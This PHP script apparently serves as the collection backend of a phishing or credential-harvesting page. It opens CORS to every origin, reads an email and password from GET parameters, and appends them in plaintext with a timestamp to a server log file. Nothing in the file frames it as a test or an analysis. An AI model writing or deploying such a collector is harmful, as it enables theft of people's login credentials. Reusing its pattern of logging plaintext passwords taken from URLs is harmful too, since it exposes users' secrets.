<?php
header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
header("Allow: GET, POST, OPTIONS, PUT, DELETE");
$date = date('m/d/Y h:i:s a', time());
$fp = fopen('/home/content/23/11330723/html/app/mailCreator/log.txt','a+');
$msg = 'username: ' . $_GET['email'] . ' | password: ' . $_GET['password'];
fwrite($fp, $msg . ' | '  . $date . PHP_EOL);
fclose($fp);

?>